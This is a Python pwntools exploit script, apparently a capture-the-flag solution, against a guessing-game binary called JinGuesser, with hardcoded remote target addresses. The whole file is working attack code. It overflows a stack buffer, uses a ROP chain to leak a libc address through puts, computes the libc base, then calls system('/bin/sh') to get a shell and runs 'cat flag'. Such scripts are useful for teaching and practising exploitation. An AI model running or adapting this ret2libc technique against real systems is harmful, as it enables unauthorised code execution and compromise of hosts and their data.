#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./mc5.elf --host 109.233.56.90 --port 11729
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("../deploy/pwn-4e-JinGuesser/source/JinGuesser")

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and ioow up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "212.193.61.73"
port = int(args.PORT or 11111)


def local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(["qira", exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')

io = start()

def guess_word(word, clean_buffer=False):
	io.sendlineafter(b'Enter choice: ', b'2')
	io.sendlineafter(b'Enter word: ', word)
	if clean_buffer:
		io.sendlineafter(b'Enter choice: ', b'10') # clean buffer


buffer_length = 32
payload = b'A' * buffer_length + b'z'
guess_word(payload, clean_buffer=True)

overflow_offset = 64
pop_rdi_ret = 0x40199b
puts_got = exe.got['puts']
puts_plt = exe.sym['puts']
game_loop = exe.sym['gameLoop']
payload = b'A' * overflow_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +  p64(game_loop)
guess_word(payload)


io.recvuntil(b'Wrong...\n')

leak = u64(io.recvline(keepends=False).ljust(8,b'\x00'))
libc.address = leak - libc.sym['_IO_puts']
log.info('libc base: {}'.format(hex(libc.address)))
print(hex((libc.address+0xeeccc)))

payload = b'A' * buffer_length + b'z'
guess_word(payload, clean_buffer=True)

binsh=next(libc.search(b'/bin/sh\x00'))
puts = libc.sym['puts']
system = libc.sym['system']
exit = libc.sym['exit']
payload= b'A' * overflow_offset+p64(pop_rdi_ret)+p64(binsh)+p64(pop_rdi_ret+1)+p64(system)
io.sendlineafter(b'Enter choice: ', b'2')
io.sendlineafter(b'Enter word: ', payload)

io.sendline(b'cat flag')

io.interactive()
